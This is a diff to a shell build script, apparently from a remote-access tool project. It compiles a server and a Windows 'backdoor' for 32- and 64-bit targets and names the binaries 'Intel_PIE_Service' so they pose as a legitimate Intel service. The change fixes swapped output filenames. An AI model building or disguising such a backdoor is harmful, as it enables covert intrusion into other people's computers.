@@ -111,9 +111,9 @@ echo "Compiling Server..."
 gcc ../src/server/server.c -o server.bin
 # compile backdoor.c
 echo "Compiling Backdoor for 32bit Windows [i686] ..."
-i686-w64-mingw32-gcc ../src/target/backdoor.c -o Intel_PIE_Service_x86_64.exe -lwininet -lwsock32
+i686-w64-mingw32-gcc ../src/target/backdoor.c -o Intel_PIE_Service_i686.exe -lwininet -lwsock32
 echo "Compiling Backdoor for 64bit Windows [x86_64] ..."
-x86_64-w64-mingw32-gcc ../src/target/backdoor.c -o Intel_PIE_Service_i686.exe -lwininet -lwsock32
+x86_64-w64-mingw32-gcc ../src/target/backdoor.c -o Intel_PIE_Service_x86_64.exe -lwininet -lwsock32
 # make server executable
 chmod +x server.bin
 cp *.bin *.exe ../dist/
